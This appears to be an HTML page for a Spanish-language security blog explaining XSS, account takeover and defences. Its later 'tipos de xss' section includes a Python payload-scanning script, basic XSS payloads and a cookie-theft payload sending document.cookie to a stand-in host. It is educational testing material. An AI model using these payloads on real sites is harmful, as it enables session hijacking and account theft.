@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="icon" type="image/x-icon" href="https://ik94g-g2ilo0g24kig24-f4ig4h79g4inuy-p.netlify.app/pfp.jpg" />
+  <title>XSS y ATO — Seguridad práctica</title>
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      color: #333;
+      background: url('https://images.alphacoders.com/296/thumb-1920-296801.jpg') no-repeat center center fixed;
+      background-size: cover;
+    }
+    body::before {
+      content: '';
+      position: fixed;
+      inset: 0;
+      background: rgba(255, 250, 246, 0.9);
+      z-index: -1;
+    }
+    header {
+      text-align: center;
+      padding: 60px 20px 40px;
+      background-color: rgba(235, 245, 255, 0.95);
+      border-bottom: 1px solid #dfe9f6;
+    }
+    header h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: 3em;
+      color: #2b6cb0;
+      margin-bottom: 10px;
+    }
+    header p {
+      font-size: 1.1em;
+      color: #444;
+      margin: 0;
+    }
+    main.container {
+      max-width: 900px;
+      margin: 30px auto 80px;
+      padding: 36px 28px;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+      line-height: 1.6;
+      color: #333;
+    }
+    h2 {
+      color: #2b6cb0;
+      font-family: 'Playfair Display', serif;
+      font-size: 2.4em;
+      margin-top: 0;
+      margin-bottom: 18px;
+    }
+    p { font-size: 1.05em; margin-bottom: 14px; }
+    h3 { color: #234e70; font-family: 'Playfair Display', serif; margin-top: 30px; margin-bottom: 12px; font-size: 1.4em; }
+    ul { margin-left: 20px; margin-bottom: 16px; }
+    ul li { margin-bottom: 8px; }
+    code { background: #f3f6fb; padding: 3px 6px; border-radius: 5px; font-family: monospace; }
+    pre { background: #f7f9fc; padding: 12px; border-radius: 8px; overflow:auto; }
+    a.button { display: inline-block; font-weight:600; color:#10539a; background:#eaf3ff; padding:10px 18px; border-radius:10px; text-decoration:none; margin-top:18px; }
+    a.button:hover { background:#d7eefe; }
+    .note { background:#fff7e6; padding:10px 12px; border-radius:8px; margin-bottom:12px; border:1px solid #ffe8b3; }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Guía: XSS y ATO</h1>
+    <p>Concepto, implicaciones y cómo proteger tus sistemas</p>
+  </header>
+
+  <main class="container">
+    <h2>Qué es XSS</h2>
+    <p><strong>Cross-Site Scripting (XSS)</strong> es una clase de vulnerabilidad que permite a un atacante introducir contenido activo (scripts, HTML) en páginas que otros usuarios ven. Si la aplicación refleja o almacena ese contenido sin validarlo ni codificarlo correctamente, el navegador del usuario ejecuta el código malicioso.</p>
+
+    <h3>Cómo funciona, en términos generales</h3>
+    <ul>
+      <li>Un atacante inserta un fragmento de código en un punto donde la aplicación muestra contenido a otros (comentarios, campos de perfil, parámetros URL).</li>
+      <li>Cuando otro usuario carga esa página, el navegador procesa y ejecuta el código inyectado.</li>
+      <li>El script puede leer datos accesibles desde la página (DOM), interactuar con APIs del navegador o realizar acciones en nombre del usuario.</li>
+    </ul>
+
+    <h2>Qué es ATO (Account Takeover)</h2>
+    <p><strong>Account takeover (ATO)</strong> se refiere al control no autorizado de una cuenta de usuario. Esto puede conseguirse mediante robo de credenciales, phishing, abuso de flujos de recuperación, o aprovechando fallos técnicos que permitan cambiar contraseñas o tokens de sesión.</p>
+
+    <h3>Qué se consigue con un ATO</h3>
+    <ul>
+      <li>Acceder a datos privados del usuario (mensajes, historial, información personal).</li>
+      <li>Realizar acciones en su nombre (transacciones, cambios de configuración, publicación de contenido).</li>
+      <li>Escalar el compromiso para alcanzar cuentas con más privilegios o pivotar dentro de la organización.</li>
+    </ul>
+
+    <h2>Cómo, conceptualmente, un XSS puede llevar a un ATO</h2>
+    <div class="note">Esta sección ofrece una explicación conceptual y defensiva. No contiene instrucciones técnicas paso a paso ni técnicas explotables.</div>
+
+    <h3>Vías conceptuales (sin detalles operativos)</h3>
+    <p>Un XSS permite ejecutar código dentro del contexto de la página legítima en el navegador de una víctima. Esa capacidad, combinada con otras debilidades o prácticas inseguras en la aplicación, puede facilitar que un atacante obtenga control de una cuenta. A continuación se resumen las vías conceptuales.</p>
+
+    <ul>
+      <li><strong>Exposición de credenciales o tokens:</strong> si datos sensibles de autenticación (cookies, tokens, códigos) son accesibles desde JavaScript o se muestran en el DOM, un script ejecutado por XSS podría leerlos. Un token válido permite a quien lo posea operar como el usuario hasta que caduque o sea revocado.</li>
+      <li><strong>Interacción con flujos de sesión y recuperación:</strong> un código inyectado puede, en el contexto de la sesión del usuario, iniciar o manipular procesos (formularios, cambios de configuración, solicitudes de recuperación). Si esos procesos son débiles, pueden derivar en un cambio de control sobre la cuenta.</li>
+      <li><strong>Interfaces falsas y engaño:</strong> XSS puede generar elementos en la página que parezcan legítimos (formularios, diálogos) para engañar al usuario y hacerle introducir credenciales, códigos o confirmar acciones sensiblemente peligrosas.</li>
+      <li><strong>Persistencia y pivotado:</strong> ataques XSS almacenados pueden ejecutarse repetidamente cuando la víctima o administradores visitan la página, lo que facilita pasos adicionales que, combinados, permiten el takeover.</li>
+      <li><strong>Combinación con otras debilidades:</strong> XSS raramente actúa solo; su impacto real depende de configuraciones de sesión, políticas de cookies, ausencia de MFA, flujos de recuperación frágiles y permisos mal aplicados.</li>
+    </ul>
+
+    <h3>Qué permitiría, a grandes rasgos, sin entrar en técnicas</h3>
+    <p>Si un atacante lograra alguno de los casos anteriores, podría:</p>
+    <ul>
+      <li>Obtener acceso temporal a la cuenta mientras la sesión o el token siga siendo válido.</li>
+      <li>Forzar o engañar al usuario para que entregue factores de autenticación adicionales.</li>
+      <li>Iniciar procesos que cambien datos de contacto o contraseñas si los controles de verificación son débiles.</li>
+    </ul>
+
+    <h3>Medidas específicas de defensa vinculadas a cada vía</h3>
+    <ul>
+      <li><strong>Mitigar exposición de tokens:</strong> almacenar tokens de sesión en cookies <code>HttpOnly</code> en lugar de en almacenamiento accesible por JS; reducir la duración de sesiones; permitir revocación inmediata.</li>
+      <li><strong>Robustecer flujos de recuperación:</strong> exigir verificaciones fuera del canal (email con enlaces de un solo uso, MFA para cambios críticos), introducir límites de tasa y revisiones manuales para cambios inusuales.</li>
+      <li><strong>Evitar interfaces engañosas:</strong> usar UI consistente y señales de seguridad para acciones críticas, y forzar reautenticación cuando se van a realizar cambios sensibles.</li>
+      <li><strong>Detectar y bloquear XSS:</strong> aplicar escape contextual, CSP restrictiva, auditorías de código y pruebas automáticas que busquen patrones de inyección.</li>
+      <li><strong>Monitoreo y respuesta:</strong> alertas por actividad de cuenta inusual, notificaciones por cambios sensibles, y procedimientos para invalidar sesiones y forzar rotación de credenciales.</li>
+    </ul>
+
+    <h3>tipos de xss</h3>
+
+XSS reflejado Ocurre cuando los datos proporcionados por el usuario se repiten en la respuesta sin la validación adecuada.</p>
+<p>Ejemplo: &lt;script&gt;alert(&#39;XSS_DEMO&#39;)&lt;/script&gt; inyectado a través de un parámetro de URL.</p>
+<p>Estos exploits ocurren cuando una aplicación web refleja entradas de usuario no validadas en el navegador del usuario sin una desinfección adecuada. En este ataque, el atacante crea una URL maliciosa que contiene un código de secuencia de comandos que, cuando la víctima hace clic en él, se ejecuta dentro del contexto de la página web vulnerable. El script malicioso no se almacena en el servidor, sino que se refleja directamente en la entrada del usuario. Las vulnerabilidades XSS reflejadas a menudo se aprovechan en ataques de phishing o para manipular la experiencia de navegación del usuario. El impacto puede ser grave, desde el robo de cookies hasta el secuestro de sesiones.</p>
+<p>XSS almacenado El script malicioso se almacena permanentemente en el servidor y se ejecuta cuando otros usuarios acceden a él.</p>
+<p>Ejemplo: script malicioso almacenado en un comentario/publicación en una publicación de foro o en una página de perfil de red social.</p>
+<p>También conocido como XSS persistente, surge cuando un atacante inyecta un código de script malicioso en una aplicación web, que luego se almacena en el lado del servidor. Este script inyectado se recupera y ejecuta posteriormente cada vez que otros usuarios acceden a la página vulnerable. Los ataques XSS almacenados son particularmente peligrosos ya que el script inyectado persiste en el tiempo, lo que puede afectar a varios usuarios y provocar una explotación generalizada. Los atacantes suelen atacar contenido generado por el usuario, como comentarios, publicaciones en foros, nombres de entidades que se muestran en páginas web o campos de perfil, para ejecutar sus cargas maliciosas. Las consecuencias del XSS almacenado pueden incluir robo de datos, apropiación de cuentas y destrucción de sitios web, lo que plantea riesgos importantes tanto para los usuarios como para la organización afectada.</p>
+<p>XSS basado en DOM La ejecución del script se basa en la manipulación del DOM en el lado del cliente.</p>
+<p>Ejemplo: el código JS recupera y ejecuta datos controlados por el usuario desde el hash de URL.</p>
+<p>Ocurre cuando una aplicación web manipula dinámicamente el DOM basándose en entradas de usuarios que no son de confianza de una manera insegura. A diferencia de los ataques XSS tradicionales, que implican procesamiento del lado del servidor, el XSS basado en DOM se manifiesta completamente en el lado del cliente. Los atacantes explotan XSS basado en DOM manipulando scripts del lado del cliente para ejecutar código arbitrario dentro del navegador de la víctima. Este tipo de XSS suele ser más difícil de detectar y mitigar, ya que la vulnerabilidad reside en el código del lado del cliente y puede no ser evidente durante las pruebas del lado del servidor. Los ataques XSS basados en DOM pueden tener diversas consecuencias, incluido el secuestro de sesión, la filtración de datos y acciones no autorizadas en nombre del usuario, lo que destaca la importancia de las medidas de seguridad del lado del cliente y las prácticas vigilantes de desarrollo de aplicaciones web.</p>
+<p>Auto-XSS Es un ataque de ingeniería social en el que un atacante engaña a un usuario para que ejecute código malicioso dentro de su navegador. A diferencia de los ataques XSS tradicionales que se dirigen a varios usuarios, Self-XSS explota la confianza del usuario para ejecutar código dentro de su sesión. Por lo general, los atacantes engañan a las víctimas para que peguen código JS aparentemente inocente en la consola de desarrollador de su navegador o en algunos campos de un sitio web con el pretexto de una acción inofensiva, como desbloquear una función u obtener recompensas. Una vez ejecutado, el código inyectado puede potencialmente comprometer la cuenta de la víctima, robar información confidencial o realizar acciones no autorizadas en su nombre. A pesar de estar limitado a la sesión de la víctima, Self-XSS sigue siendo una amenaza, lo que enfatiza la importancia de la educación y concientización del usuario para reconocer y evitar tales tácticas engañosas.</p>
+<p>Pruebas Automatización Utilice herramientas de prueba de seguridad como OWASP ZAP, Burp Suite, XSStrike, PwnXSS, XSSer, Acunetix, etc. para escaneos automatizados en busca de XSS. Configure herramientas para rastrear la aplicación, identificar vectores de entrada e inyectar cargas útiles para detectar vulnerabilidades XSS. Analice los resultados del análisis en busca de vulnerabilidades identificadas, reprodúzcalos manualmente, cree PoC, comprenda el impacto potencial y priorice la solución de problemas. Puedes escribir algunos guiones; Prefiero Python, por ejemplo:</p>
+<p>import requests def test_xss(url, parameter): payloads = [ &quot;&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;&quot;, &quot;&lt;img src=x onerror=alert(1)&gt;&quot;, # list of your payloads ] for payload in payloads: modified_url = f&#39;{url}?{parameter}={payload}&#39; response = requests.get(modified_url) if payload in response.text: print(f&#39;Potential XSS detected here - {modified_url}&#39;) # example test_xss(&quot;https://testwebsite.com/search&quot;, &quot;query_param_name&quot;) Prueba manual Identificar vectores de entrada susceptibles a la inyección XSS (por ejemplo, campos de entrada, parámetros de URL). Puede utilizar rastreadores y rastreadores para identificar vectores de manera más eficiente. Cree cargas útiles para explotar las vulnerabilidades XSS (por ejemplo, etiquetas de script, controladores de eventos). Analice las respuestas para determinar si las cargas útiles se reflejan o ejecutan. Cree PoC, comprenda el impacto potencial y priorice la solución de problemas.</p>
+<p>Pasos:</p>
+<p>Ingrese una etiqueta de secuencia de comandos, seguida de un código JS, en los campos de entrada de su aplicación.</p>
+<p>Por ejemplo, cargas útiles XSS básicas:</p>
+<p>&lt;script&gt;alert(&#39;XSS&#39;);&lt;/script&gt; (%0ejavascript:alert(/XSS/)) &lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt; // Display alert dialog with &#39;XSS&#39; message. &lt;img src=x onerror=alert(((123)&gt; // Load broken image, trigger alert with &#39;123&#39;. // Cookie Theft Payload: &lt;img src=&quot;http://website.com/stealcookie?cookie=&quot;+document.cookie&gt; // Sends victim&#39;s cookies to attacker-controlled server. // DOM-based XSS Payload: #&quot;&gt;&lt;img src=x onerror=alert(123)&gt; // Exploits DOM manipulation, triggers alert on vulnerable pages. Envíe la entrada y vea si el script se ejecuta.</p>
+<p>Si es así, entonces la aplicación es vulnerable a ataques XSS.</p>
+<p>Si el script no se ejecuta, intente modificar la entrada agregando otras etiquetas HTML, como &lt;img&gt; o &lt;iframe&gt; , y vea si se reflejan en la página, por ejemplo (esta casi siempre funciona para mí):</p>
+<p>&lt;b&gt;t&lt;/b&gt;#`&quot;/*—est</p>
+<p>Puede agregar una secuencia de comandos para consultar los parámetros de la URL de su aplicación web o un nombre de usuario, nombres de archivos cargados o cualquier texto que se mostrará en la página de la aplicación y que pueda cambiar.</p>
+<p>Tenga en cuenta las validaciones frontales de las entradas. Intente siempre enviar el valor mediante una solicitud directa (usando Postman, Burp o cualquier herramienta similar).</p>
+<p>Verifique la consola del navegador en las herramientas de desarrollo porque a veces es posible que no vea ningún cambio visible en la página, pero algunos símbolos, por ejemplo `&quot;/*— pueden alterar el JS/HTML de la página y verá una advertencia en la consola que podría Ser una pista para usted sobre cómo modificar su carga útil para obtener una PoC XSS.</p>
+<p>Utilice fuzzing y una lista de cargas útiles: automatice este enfoque cuando sea posible o utilice herramientas especiales para ello.</p>
+<p>Personalmente, me gusta usar cargas útiles e información de aquí ; en mi opinión, es un recurso muy útil.</p>
+<p>Pruebas de caja negra Identificación de vectores de entrada vulnerables a la inyección XSS. Elaborar e inyectar cargas útiles XSS para evaluar el impacto e identificar puntos vulnerables. Pruebas de caja gris Análisis del código fuente y procedimientos de desinfección para posibles XSS. Aprovechar el conocimiento parcial de la aplicación para pruebas específicas. Explotando XSS Prueba de concepto XSS</p>
+<p>Demuestra la confirmación de la vulnerabilidad XSS mediante la inyección de cargas útiles que ejecutan JS arbitrario. Utilizar cargas útiles alternativas como la función print() para los navegadores Chrome posteriores a la versión 92. Explotación XSS avanzada</p>
+<p>Para robar cookies, realizar secuestro de sesión o ejecutar código arbitrario. Para hacerse pasar por usuarios, capturar credenciales o desfigurar páginas web. Omitir filtros XSS</p>
+<p>Evadir los filtros XSS comunes mediante diversas técnicas, como la inserción de valores de atributos de etiquetas, la ofuscación y la contaminación de parámetros HTTP (HPP). Los escenarios de ejemplo muestran cómo omitir mecanismos de filtro para ejecutar cargas XSS con éxito. Técnicas de Prevención Validación de entrada y codificación de salida Implemente mecanismos de validación de entrada (FE y BE) para garantizar que los datos proporcionados por el usuario cumplan con los formatos esperados y no contengan código malicioso. Desinfecte y valide todas las entradas del usuario en el lado del servidor antes de procesarlas o almacenarlas. Codifique los datos de salida de forma adecuada para evitar que el navegador los interprete como contenido activo. Utilice técnicas de codificación como codificación de entidades HTML, codificación de URL y escape JS según el contexto de los datos de salida. Política de seguridad de contenido (CSP) Implemente encabezados de Política de seguridad de contenido (CSP) para definir y aplicar políticas de seguridad con respecto a la ejecución de scripts, hojas de estilo y otros recursos dentro de la aplicación web. CSP permite a los administradores restringir las fuentes desde las cuales se pueden cargar los scripts, mitigando el riesgo de ataques XSS al impedir la ejecución de scripts no autorizados. Configure directivas CSP para especificar dominios confiables, uso de estilos y secuencias de comandos en línea y secuencias de comandos nonces, lo que reduce de manera efectiva la superficie de ataque para XSS. Codificación de salida específica del contexto Codifique datos según el contexto en el que se representan los datos de salida. Aplique diferentes métodos de codificación para HTML, JS, CSS y otros contextos para garantizar una protección integral contra XSS.</p>
+<p>Por ejemplo , utilice codificación de entidad HTML para contenido HTML, escape JavaScript para contextos de secuencias de comandos en línea y escape CSS para atributos de estilo para evitar la inyección de secuencias de comandos y mantener la integridad de los datos en varios contextos de salida.</p>
+<p>Listas blancas y negras de entradas Implemente listas blancas y negras de entradas para filtrar y validar las entradas de los usuarios en función de listas permitidas y denegadas predefinidas de caracteres, patrones o tipos de contenido permitidos y prohibidos.</p>
+<p>La inclusión en la lista blanca implica definir explícitamente los formatos de entrada esperados y rechazar cualquier entrada que no se ajuste a estas especificaciones. Las listas negras identifican y bloquean entradas o patrones maliciosos conocidos, aunque pueden ser menos efectivas debido al potencial de evasión mediante técnicas de codificación u ofuscación. Encabezados de seguridad y bibliotecas de desinfección Utilice encabezados de seguridad como X-XSS-Protection, X-Content-Type-Options y X-Frame-Options para mejorar la seguridad de las aplicaciones web y prevenir diversos vectores de ataque, incluido XSS. Integre bibliotecas y marcos de desinfección de terceros en la pila de desarrollo para automatizar la validación de entradas, la codificación de salidas y otras tareas críticas para la seguridad. Actualice y mantenga periódicamente estas bibliotecas para abordar las amenazas y vulnerabilidades emergentes de manera efectiva.</p>
+
+    <a href="index.html" class="button">← Volver al blog</a>
+  </main>
+
+</body>
+</html>
